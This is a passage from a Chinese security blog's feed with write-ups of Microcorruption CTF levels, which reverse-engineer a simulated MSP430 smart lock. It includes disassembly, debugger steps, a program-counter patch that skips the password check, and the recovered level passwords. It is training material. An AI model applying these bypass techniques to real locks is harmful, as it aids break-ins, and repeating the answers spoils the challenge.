#0x44ae &lt;check_password+0x24&gt;</span><br><span class="line">44ac: 0e43           clr   r14</span><br><span class="line">44ae: 0f4e           mov   r14, r15</span><br><span class="line">44b0: 3041           ret</span><br></pre></td></tr></table></figure><p>可以看到，<strong>check_password</strong>中一共有4个<code>cmp</code>指令，将源操作数与<code>r15</code>寻址的内存中的内容比较，且目的操作数之后都是以两个字节偏移递增。若是经过4次<code>cmp</code>比较，<code>r15</code>将会被赋值为0x1，也就是能通过密码检查。</p><p>需要注意的是这里使用的是<code>cmp</code>，与上一等级的<code>cmp.b</code>相比，少了<code>.b</code>扩展名也叫助记符，所以操作数不再是一字节（byte）；<code>cmp</code>虽然省略了<code>.w</code>扩展名，但其相当于<code>cmp[.w]</code>，操作数是一个字（word）。在msp430用户指南中解释，<strong>如果不使用扩展名，指令是一个字指令</strong>。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/11.png" alt="img"></p><p>此时，我们需要知道<code>r15</code>所寻址的内存地址，我们回到<strong>main</strong>函数中可以发现，调用<strong>check_password</strong>函数前，将<code>sp</code> 当前栈指针移动到<code>r15</code>，<code>sp</code>的值我们还不知道，那我们开始调试吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4438 &lt;main&gt;</span><br><span class="line">...</span><br><span class="line">444a: 0f41           mov   sp, r15</span><br><span class="line">444c: b012 8a44     call   #0x448a &lt;check_password&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用<code>break 444a</code>命令，在地址0x444a处设置断点，查看<code>sp</code>的值以及<code>sp</code>指向的栈空间的内容。首先会调用请求输入<strong>get_password</strong>函数，我们输入”test“，进行测试。</p><p>输入完毕后，在此<code>c</code>命令运行，执行到地址0x444a后中断，我们可以查看<code>sp</code>的值，栈空间（sp）的内容正是我们输入密码。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/12.png" alt="img"></p><p>继续设置断点<code>break check_password</code>，然后<code>c</code>运行，进入<strong>check_password</strong>分析，我们已经知道<code>r15</code>寻址的内存中内容正是我们输入的密码，所有将<code>cmp</code>的源操作数提取出来，依次是0x412c、0x673c、0x653c、0x636b，这应该就是正确密码了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">448a: bf90 2c41 0000 cmp   #0x412c, 0x0(r15)</span><br><span class="line">4492: bf90 3c67 0200 cmp   #0x673c, 0x2(r15)</span><br><span class="line">449a: bf90 3c65 0400 cmp   #0x653c, 0x4(r15)</span><br><span class="line">44a4: bf90 6b63 0600 cmp   #0x636b, 0x6(r15)</span><br></pre></td></tr></table></figure><p>这里有一个问题，将以上16进制数组合起来：412c673c653c636b，若是直接作为输入肯定是会出错的，因为，我们还忽略了字节序的问题，MSP430的是小端存储（little-endian），所以我们需要将其高字节与低字节进行交换。</p><p>关于字节序，大家都不陌生，维基百科中关于字节序中介绍：</p><blockquote><p>字节的排列方式有两个通用规则。例如，一个多位的整数，按照存储地址从低到高排序的字节中，如果该整数的最低有效字节（类似于最低有效位）在最高有效字节的前面，则称<strong>小端序</strong>；反之则称<strong>大端序</strong>。</p></blockquote><h3 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h3><p>勾选16进制编码输入复选框，以16进制编码输入：2c413c673c656b63。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/13.png" alt="img"></p><p>解锁成功！</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/14.png" alt="img"></p><p>以上就是本期《锁王创造营》的全部内容了，对闯关以及其他问题感兴趣的小伙伴可以加一下我们的技术交流群哦！</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/15.jpg" alt="img"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、 MSP430 用户指南 <a href="http://www.ti.com.cn/cn/lit/ug/zhcu032i/zhcu032i.pdf" target="_blank" rel="noopener">http://www.ti.com.cn/cn/lit/ug/zhcu032i/zhcu032i.pdf</a><br>2、智能锁具攻防一:初探 <a href="https://yaseng.org/intelligent-lock-attack-and-defense-1.html">https://yaseng.org/intelligent-lock-attack-and-defense-1.html</a><br>3、智能锁行业安全分析报告 <a href="https://yaseng.org/intelligent-lock-industry-safety-report.html">https://yaseng.org/intelligent-lock-industry-safety-report.html</a><br>4、物联网安全百科 <a href="https://iot-security.wiki" target="_blank" rel="noopener">https://iot-security.wiki</a></p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;“2020年4月30日起，丰巢快递柜开始实行超时收费的“会员制”，非会员包裹只可免费保存12小时，超过需收取0.5元/12小
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="终端安全" scheme="http://yaseng.org/tags/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能锁安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能锁破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="指纹锁安全" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="长毛锁王" scheme="http://yaseng.org/tags/%E9%95%BF%E6%AF%9B%E9%94%81%E7%8E%8B/"/>
    
      <category term="锁具 ctf" scheme="http://yaseng.org/tags/%E9%94%81%E5%85%B7-ctf/"/>
    
      <category term="智能快递柜破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E5%BF%AB%E9%80%92%E6%9F%9C%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="智能终端安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>《锁王创造营》第一关：初出茅庐</title>
    <link href="http://yaseng.org/king-of-lock-1.html"/>
    <id>http://yaseng.org/king-of-lock-1.html</id>
    <published>2020-05-07T16:00:00.000Z</published>
    <updated>2020-05-22T16:51:59.458Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/0002.jpg" alt=""></p><p>最近大热的网播剧《鬼吹灯之龙岭迷窟》着实让屏幕前的观众跟着过了一把古墓闯关寻宝的瘾，剧中主角胡八一、王胖子、shirley杨强强联手，带领一众人马凭着生平学识积累、过人的胆识以及精良的装备，破解重重机关锁制，最终取得龙骨天书，获取破解诅咒的关键线索。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/0001.jpg" alt=""></p><p>从古至今，摸金校尉与墓主人开展了无数次生死较量。地上的梁上君子们也没闲着，从最早的溜门撬锁，到如今的锡纸开锁，对锁具的攻防就从未停止过。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/0%E9%94%81%E7%8E%8B.jpg" alt=""></p><p>如今，物联网技术迅速发展，作为新时代守护老百姓生命财产的重要一环，智能锁已成为智能家居市场上发展最为迅速的品类之一。有研究表明，随着市场的需要，智能锁所占的份额逐年增加，大有超过传统锁具，成为主流的趋势。不过就目前而言，智能锁暴露的安全问题比传统机械锁更大，因为，机械锁具的攻击点主要在锁芯和锁体结构，而智能锁除以上提到的两点之外，还涉及到云端通信、移动端、集成电路模块、指纹、声纹、图像识别、RFID 等关键技术，所以暴露的攻击点更多、攻击方式更为隐蔽，造成的危害可能更大。此外，许多智能锁厂商并非由传统锁具厂商转型过来，在锁具生产加工制造上，更容易忽略某些机械和设计结构上的物理缺陷，这也是智能锁在安全问题上必须要重视的地方。</p><p>正因智能锁具已成为人们现实生活中新一代的保护神，其安全可靠性就是其生命力所在，不安全锁具无疑是给生活留下了极大的安全隐患。数智安全研究院对锁具安全研究着手多年，参与过很多智能锁具安全方面的会议、沙龙等，在锁具安全研究方面也有了些许成果。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/1.png" alt=""></p><p>(破解某款智能锁)</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/2.png" alt=""></p><p>(线下沙龙锁具安全展台)</p><p>近日，数智安全实验室的小伙伴本着猎奇心理参与了Microcorruption发起的一个智能锁破解闯关的游戏，18道关卡，历时五天，最终全部破解，由于游戏关卡设置的新颖以及破解过程的种种趣味体验，也为了让更多志同道合的朋友更好的了解智能锁具安全攻防，我们决定在每周更新的内容里增加一个<strong>《锁王创造营》系列，</strong>每期发布一些智能锁具安全方面的知识以及一道关卡的破解记录，感兴趣的小伙伴可以先不参考我们的思路，自己尝试着破解看看哦！</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/0003.png" alt=""></p><p>（闯关开始啦，快速转动你们的小脑筋！！）</p><h2 id="Microcorruption-CTF"><a href="#Microcorruption-CTF" class="headerlink" title="Microcorruption CTF"></a>Microcorruption CTF</h2><p><a href="https://microcorruption.com/" target="_blank" rel="noopener">Microcorruption</a>是Matasano Security 与 Square制作的一款智能锁在线CTF”游戏“，该CTF专注于嵌入式安全和挑战玩家逆向工程的一个虚构“Lockitall LockIT Pro”锁系统。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/3.png" alt=""></p><p>每一个Level都通过反汇编窗口，内存窗口，寄存器窗口和调试控制台进行调试，如图所示，这是由Web浏览器构建的调试器。在调试控制台上输入“help”，查看调试指令。若刚开始挑战，建议先完成Tutorial新手教程，它将为你介绍这个调试器，以及如何达成目标过关。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/4.png" alt=""></p><p>如反汇编窗口所示，它是由MSP430控制的锁，实时模拟真实设备，我们的目标是在内存中寻找特定的输入，或者找到漏洞然后进行利用达到解锁的目的。该CTF是对嵌入式安全性的不错介绍，不需要购买真实的硬件，甚至还有<a href="https://microcorruption.com/manual.pdf" target="_blank" rel="noopener">用户手册</a>，非常适合初学者入门。</p><h3 id="玩法介绍"><a href="#玩法介绍" class="headerlink" title="玩法介绍"></a>玩法介绍</h3><p>下面我们先看第一level——Tutorial调试器指导教程，此教程将逐步介绍这个web调试器。</p><p>使用<code>continue</code>或<code>c</code>命令运行程序。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/5.png" alt=""></p><p>运行后，若没有其它断点，将弹出IO控制窗口，这里显示控制台的输出，提示我们输入密码。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/6.png" alt=""></p><p>然后下面是用户输入文本框，我们输入“test”，然后“send”提交，锁将会提取该输入。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/7.png" alt=""></p><p>继续<code>c</code>命令运行。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/8.png" alt=""></p><p>运行完毕后可以看到，底下的另一个IO控制窗口提出输出：无效密码。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/9.png" alt=""></p><p>此时，意味着程序执行完毕，所以CPU将会关闭。需要在控制台上输入<code>reset</code>，进行重置CPU状态。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/10.png" alt=""></p><p>重置（reset）CPU以后，现在在<strong>main</strong>函数上设置断点，查看<strong>main</strong>函数做了什么事情。在控制台窗口输入命令：<code>break main</code>；或者输入：<code>b main</code>。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/11.png" alt=""></p><p>使用<code>c</code>命令运行，程序将会断在main函数（红色代表正在待执行的指令）。由蓝色背景设置的就是断点的位置。我们也可以通过鼠标单击它，来删除断点或者设置断点。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/12.png" alt=""></p><p>寄存器窗口显示断点时的状态，它们都是由16进制显示。右侧显示当前程序计数器pc处的指令。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/13.png" alt=""></p><p>现在我们可以使用<code>step</code>或<code>s</code>命令进行单步步入调试。该命令有可选参数，后面加上5a，将步过5a条指令。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/14.png" alt=""></p><p>现在执行到<strong>INT</strong>函数中，这是锁与用户交互的重要方式，通过发出中断，锁可以打印字符，请求输入或执行其他功能的操作。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/15.png" alt=""></p><p>继续使用<code>`c</code>命令运行，直到弹出请求输入。在不知道密码的情况下，仍输入“test”。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/16.png" alt=""></p><p>现在使用<code>out</code>或者<code>f</code>命令退出当前函数，它一直运行直到遇到下一条“ret”指令。经过几次“ret”之后，回到<strong>main</strong>函数中，0x444c是调用<strong>check_password</strong>函数，似乎是一个关键检查函数，尝试在该函数设置断点<code>break check_password</code>。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/17.png" alt=""></p><p>使用<code>c</code>命令，程序成功断在<strong>check_password</strong>函数。待执行的指令是“mov.b @r15, r14”，这意味着将r15寄存器寻址的内容移动到r14寄存器中。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/18.png" alt=""></p><p>先查看r15寄存器，r15的值为0x439c。该地址正是“test”字符串的起始地址。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/19.png" alt=""></p><p>在控制台窗口输入<code>s</code>单步命令，再查看寄存器窗口中r14的变化。r14的值变为0x74，0x74是字符“t”的ascii码。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/20.png" alt=""></p><p>继续“s”命令单步执行，“inc r15”意味着r15自增1。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/21.png" alt=""></p><p>执行下一条指令，继续“s”命令单步执行，“inc r12”意味着r12自增1。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/22.png" alt=""></p><p>下一条指令，“tst r14”，这条指令比较r14是否为零。它将r14中的值与常数0进行比较，结果将在状态寄存器sr中；若r14为零，这里则设置零标志位。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/23.png" alt=""></p><p>单步执行“tst r14”后，紧接着是“jnz $-0x8”（如果不为零，则跳转），jnz是条件跳转指令，当未设置零标志位时，它将移动程序计数器pc，向后跳8个字节。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/24.png" alt=""></p><p>此时，我们将鼠标悬停在状态寄存器sr上，可以查看设置的标志位。“C”表示已设置进位标志位（Carry），这里未设置零标志位。所以这里”jnz“将实现跳转。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/25.png" alt=""></p><p><code>s</code>执行单步之后，向前移动0x8个字节，回到了开始的地方。所以这个循环中的主要的操作是，读取一字节我们的输入，便将r12寄存器加1。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/26.png" alt=""></p><p>现在我们跳出这个循环，直到r14寄存器为0使，才会跳出循环，即在0x448e处设置断点<code>break 448e</code>。使用<code>unbreak check_password</code>可以删除其它断点。随后使用“c”命令运行。*</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/27.png" alt=""></p><p>此时运行的指令是“cmp #0x9, r12”，它比较两个值，也就是把r12的值与立即数0x9进行比较，cmp的功能相当于减法指令，只是不保存结果，而是设置状态寄存器中的零标志位。此时我们的r12为5，这是因为我们输入了4个字符的密码，其中最后一个是空字节。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/28.png" alt=""></p><p>执行完“cmp #0x9, r12”后，紧接着是jeq/jz指令（如果相等则跳转/如果为0则跳转，它们是等效的），它和jnz一样都是条件跳转。如果cmp比较为真（如果r12为9），则移动pc向后跳转6个字节。但是在这里，cmp比较为假（因为r12为5），未设置状态寄存器的零标志位，所以不进行跳转。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/29.png" alt=""></p><p>命令<code>s</code>单步之后，将r15寄存器清0，然后返回。r15一般用作存放函数返回值结果，因此<strong>chekc_password</strong>函数的返回值为0。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/30.png" alt=""></p><p>我们在这里直接更改程序计数器pc，使用<code>let pc = 4498</code>，将pc指向地址0x4498（mov #0x1， r15），将立即数0x1移动到r15寄存器中。然后使用<code>f</code>命令回到<strong>main</strong>函数，我们看main函数将会发生什么。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/31.png" alt=""></p><p>在main函数中，再次运行”tst”指令，检查r15（check_password函数的返回值）是否非零，并相应地设置状态零标记位。我们知道r15为1，并且当r15不为0时发生跳转。使用<code>s</code>命令继续单步执行。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/32.png" alt=""></p><p>单步执行后，跳转到访问“Access Granted!”字符串，然后put打印。接着调用unlock_door函数解锁。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/33.png" alt=""></p><p>使用<code>c</code>命令运行。刚刚我们通过更改pc，到达所需指令进行欺骗。接下来需要通过正确的密码解锁。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/34.png" alt=""></p><p>reset之后，使用<code>c</code>运行到请求输入窗口。在请求窗口中，我们还可以勾选16进制编码输入。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/35.png" alt=""></p><p>现在输入正确的密码，在之前check_password时，我们知道r12必须是9。因此我们需要增加到8个字符的输入，末尾自动包含1个空字符。尝试使用8位的“password”作为输入。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/36.png" alt=""></p><p>使用<code>c</code>运行，密码正确！</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/37.png" alt=""></p><p>现在我们在实锁中执行它，在控制台窗口输入<code>solve</code>。这时我们将无法进行任何调试，只能输入密码。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/38.png" alt=""></p><p>解锁成功！现在我们返回地图，挑战下一关。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/42.png" alt=""></p><h3 id="第一关-New-Orleans"><a href="#第一关-New-Orleans" class="headerlink" title="第一关 New Orleans"></a>第一关 New Orleans</h3><p>经过Tutorial，我们对调试器已经有了详细的了解。现在开始正式关卡的挑战，它的每一关都是世界各地的某个城市名，随着level数量的增加，难度也在增加。现在开始第一个Level的挑战——New Orleans。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/39.png" alt=""></p><blockquote><p>OVERVIEW</p><ul><li>This is the first LockIT Pro Lock.</li><li>This lock is not attached to any hardware security module.</li></ul></blockquote><p>查看反汇编窗口，开头是一些初始化或设置工作的函数。我们选择在<strong>main</strong>处设置断点，在控制台窗口输入<code>b main</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4438 &lt;main&gt;</span><br><span class="line">4438:  3150 9cff      add    #0xff9c, sp</span><br><span class="line">443c:  b012 7e44      call    #0x447e &lt;create_password&gt;</span><br><span class="line">4440:  3f40 e444      mov    #0x44e4 &quot;Enter the password to continue&quot;, r15</span><br><span class="line">4444:  b012 9445      call    #0x4594 &lt;puts&gt;</span><br><span class="line">4448:  0f41           mov    sp, r15</span><br><span class="line">444a:  b012 b244      call    #0x44b2 &lt;get_password&gt;</span><br><span class="line">444e:  0f41           mov    sp, r15</span><br><span class="line">4450:  b012 bc44      call    #0x44bc &lt;check_password&gt;</span><br><span class="line">4454:  0f93           tst    r15</span><br><span class="line">4456:  0520           jnz    #0x4462 &lt;main+0x2a&gt;</span><br><span class="line">4458:  3f40 0345      mov    #0x4503 &quot;Invalid password; try again.&quot;, r15</span><br><span class="line">445c:  b012 9445      call    #0x4594 &lt;puts&gt;</span><br><span class="line">4460:  063c           jmp    #0x446e &lt;main+0x36&gt;</span><br><span class="line">4462:  3f40 2045      mov    #0x4520 &quot;Access Granted!&quot;, r15</span><br><span class="line">4466:  b012 9445      call    #0x4594 &lt;puts&gt;</span><br><span class="line">446a:  b012 d644      call    #0x44d6 &lt;unlock_door&gt;</span><br><span class="line">446e:  0f43           clr    r15</span><br><span class="line">4470:  3150 6400      add    #0x64, sp</span><br></pre></td></tr></table></figure><p>浏览<strong>main</strong>中<code>call</code>的函数，<strong>create_password</strong>、<strong>puts</strong>、<strong>get_password</strong>、<strong>check_password</strong>和<strong>unlock_door</strong>函数，其中<strong>create_password</strong>似乎创建生成了密码，<strong>pust</strong>是打印提示字符串，<strong>get_password</strong>是请求输入密码，而<strong>check_password</strong>是对密码进行检查，和前一关一样<strong>unlock_door</strong>是解锁函数。</p><p>首先进入<strong>create_password</strong>看看。该函数正在mov.b一字节一字节的的数据到r15（0x2400）寻址的内存中，这些数据似乎是ascii码，最后一个字节以\x0结尾，合并在一起组成一个字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">447e &lt;create_password&gt;</span><br><span class="line">447e:  3f40 0024      mov    #0x2400, r15</span><br><span class="line">4482:  ff40 4600 0000 mov.b    #0x46, 0x0(r15)</span><br><span class="line">4488:  ff40 6c00 0100 mov.b    #0x6c, 0x1(r15)</span><br><span class="line">448e:  ff40 6c00 0200 mov.b    #0x6c, 0x2(r15)</span><br><span class="line">4494:  ff40 4900 0300 mov.b    #0x49, 0x3(r15)</span><br><span class="line">449a:  ff40 6600 0400 mov.b    #0x66, 0x4(r15)</span><br><span class="line">44a0:  ff40 2800 0500 mov.b    #0x28, 0x5(r15)</span><br><span class="line">44a6:  ff40 3900 0600 mov.b    #0x39, 0x6(r15)</span><br><span class="line">44ac:  cf43 0700      mov.b    #0x0, 0x7(r15)</span><br><span class="line">44b0:  3041           ret</span><br></pre></td></tr></table></figure><p>我们<code>n</code>命令步过这个函数，然后查看内存0x2400的内容。<code>&quot;FllIf(9&quot;</code>莫非是密码？</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/40.png" alt=""></p><p>接下来在<strong>check_password</strong>下断点，然后<code>c</code>命令运行。在请求输入时，选择以<code>&quot;FllIf(9&quot;</code>作为输入。</p><p>果然，在地址0x44c2中”cmp.b @r13, 0x2400(r14)“比较1个字节，r13寄存器寻址的正是我们输入的密码，而0x2400(r14)是<strong>create_password</strong>函数生成的字符串<code>&quot;FllIf(9&quot;</code>。经过循环比较每一个字节，判断我们的输入和<code>&quot;FFllIf(9&quot;</code>是否相等，最后设置返回值r15。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">44bc &lt;check_password&gt;</span><br><span class="line">44bc:  0e43           clr    r14</span><br><span class="line">44be:  0d4f           mov    r15, r13</span><br><span class="line">44c0:  0d5e           add    r14, r13</span><br><span class="line">44c2:  ee9d 0024      cmp.b    @r13, 0x2400(r14)</span><br><span class="line">44c6:  0520           jne    #0x44d2 &lt;check_password+0x16&gt;</span><br><span class="line">44c8:  1e53           inc    r14</span><br><span class="line">44ca:  3e92           cmp    #0x8, r14</span><br><span class="line">44cc:  f823           jne    #0x44be &lt;check_password+0x2&gt;</span><br><span class="line">44ce:  1f43           mov    #0x1, r15</span><br><span class="line">44d0:  3041           ret</span><br><span class="line">44d2:  0f43           clr    r15</span><br><span class="line">44d4:  3041           ret</span><br></pre></td></tr></table></figure><p>至此，我们已经猜中密码正是<strong>create_password</strong>函数生成的字符串，使用<code>c</code>命令运行，测试正确。</p><h4 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h4><p>在控制台窗口输入”solve“，然后在请求输入窗口以字符串输入：FllIf(9，或者16进制输入：466c6c49662839。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/1/41.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、 MSP430 用户指南 <a href="http://www.ti.com.cn/cn/lit/ug/zhcu032i/zhcu032i.pdf" target="_blank" rel="noopener">http://www.ti.com.cn/cn/lit/ug/zhcu032i/zhcu032i.pdf</a><br>2、智能锁具攻防一:初探 <a href="https://yaseng.org/intelligent-lock-attack-and-defense-1.html">https://yaseng.org/intelligent-lock-attack-and-defense-1.html</a><br>3、智能锁行业安全分析报告 <a href="https://yaseng.org/intelligent-lock-industry-safety-report.html">https://yaseng.org/intelligent-lock-industry-safety-report.html</a><br>4、物联网安全百科 <a href="https://iot-security.wiki" target="_blank" rel="noopener">https://iot-security.wiki</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="智能锁安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能锁破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="指纹锁安全" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="长毛开锁" scheme="http://yaseng.org/tags/%E9%95%BF%E6%AF%9B%E5%BC%80%E9%94%81/"/>
    
      <category term="长毛锁王" scheme="http://yaseng.org/tags/%E9%95%BF%E6%AF%9B%E9%94%81%E7%8E%8B/"/>
    
      <category term="锁具 ctf" scheme="http://yaseng.org/tags/%E9%94%81%E5%85%B7-ctf/"/>
    
      <category term="鬼吹灯" scheme="http://yaseng.org/tags/%E9%AC%BC%E5%90%B9%E7%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>嵌入式安全利器 JTAGulator 的制作与调试实战</title>
    <link href="http://yaseng.org/diy-JTAGulator-and-debugging.html"/>
    <id>http://yaseng.org/diy-JTAGulator-and-debugging.html</id>
    <published>2020-04-15T16:00:00.000Z</published>
    <updated>2020-04-20T09:18:39.995Z</updated>
    
